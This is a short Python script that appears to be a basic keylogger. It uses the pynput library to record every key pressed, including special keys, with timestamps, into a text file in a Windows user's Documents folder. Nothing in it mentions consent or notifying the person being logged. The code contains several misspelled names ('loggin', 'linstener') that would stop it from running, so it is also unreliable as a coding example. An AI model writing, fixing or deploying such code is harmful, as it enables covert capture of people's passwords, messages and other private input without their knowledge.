from pynput import keyboard
import logging

log_file = "C:\\Users\\soporte\\Documents\\logs.txt"

logging.basicConfig(filename=log_file, level=loggin.DEBUG,
format="%(asctime)s: %(message)s")

def on_press(key):
  try:
    loggin.info(f"Tecla {key.char}")
  except AttributeError:
    loggin.info(f"Tecla especial {key}")

with keyboard.Listener(on_press=on_press) as listener:
  linstener.join()